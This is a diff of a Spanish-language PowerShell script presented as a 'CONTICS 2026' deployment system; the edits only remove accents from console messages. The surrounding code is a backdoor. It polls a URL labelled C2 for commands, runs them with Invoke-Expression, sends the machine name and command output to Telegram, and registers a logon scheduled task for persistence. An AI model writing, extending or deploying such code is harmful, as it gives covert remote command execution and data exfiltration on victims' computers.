@@ -31,7 +31,7 @@ Write-Host "      SISTEMA DE DESPLIEGUE CONTICS 2026" -ForegroundColor Cyan
 Write-Host "======================================================" -ForegroundColor Cyan
 
 # --- [2] RECEPTOR DE TAREAS (C2) ---
-Write-Host "`n[1/4] Buscando órdenes en GitHub..." -ForegroundColor Yellow
+Write-Host "`n[1/4] Buscando ordenes en GitHub..." -ForegroundColor Yellow
 try {
     $TareaData = Invoke-WebRequest -Uri $TareaUrl -UseBasicParsing -ErrorAction SilentlyContinue
     if ($TareaData) {
@@ -40,9 +40,9 @@ try {
             $null = Send-Telegram -Message "⚡ *EJECUTANDO EN:* $env:COMPUTERNAME`n`n*Orden:* `$Tarea"
             $Out = Invoke-Expression $Tarea 2>&1 | Out-String
             $null = Send-Telegram -Message "✅ *RESULTADO:*`n$Out"
-            Write-Host " [+] Comando ejecutado con éxito." -ForegroundColor Green
+            Write-Host " [+] Comando ejecutado con exito." -ForegroundColor Green
         } else {
-            Write-Host " [+] Sin órdenes pendientes." -ForegroundColor Gray
+            Write-Host " [+] Sin ordenes pendientes." -ForegroundColor Gray
         }
     }
 } catch {
@@ -98,10 +98,10 @@ Register-ScheduledTask -TaskName $TaskName -Action $Action -Trigger $Trigger -Se
 
 Write-Host " [+] PERSISTENCIA:  " -NoNewline; Write-Host "ACTIVA (LogOn)" -ForegroundColor Green
 Write-Host "`n------------------------------------------------------" -ForegroundColor Cyan
-Write-Host "Abriendo panel de gestión..." -ForegroundColor Gray
+Write-Host "Abriendo panel de gestion..." -ForegroundColor Gray
 
 # Abre la página que te gusta
 Start-Process $mUrl 
 
-Write-Host "`nProceso completado. Sistema CONTICS en línea." -ForegroundColor White
+Write-Host "`nProceso completado. Sistema CONTICS en linea." -ForegroundColor White
 Start-Sleep -Seconds 2
